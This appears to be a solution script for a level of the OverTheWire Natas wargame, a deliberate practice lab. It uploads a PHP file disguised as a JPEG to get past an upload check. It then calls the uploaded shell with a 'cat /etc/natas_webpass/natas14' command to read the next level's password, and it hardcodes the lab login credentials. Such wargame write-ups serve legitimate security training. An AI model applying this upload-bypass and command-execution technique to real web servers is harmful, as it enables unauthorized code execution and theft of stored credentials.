#!  usr/bin/env python
import requests
import urllib
import base64
username="natas13"
password="jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY"
url = "http://%s.natas.labs.overthewire.org/" % username
session = requests.Session()
files = {'uploadedfile' : ('file.jpg' , open('/home/tw3/Desktop/overthewire/natas/source_second_natas12.php.jpg','rb'))}
data= { 'filename' : 'file.php' , "MAX_FILE_SIZE" : '1000'}
# response = session.post(url , data = data,auth = (username , password) , files = files)
# print session.headers
# response.set_cookie(cook)
response = session.post(url+'upload/b9lx13po8z.php?c=cat /etc/natas_webpass/natas14'  , data = data,auth = (username , password) , files = files)
# print ("\n")
# print (response.cookies.get_dict())
# print session.cookies["data"]

# print	 urllib.unquote(session.cookies["data"])
print (response.text)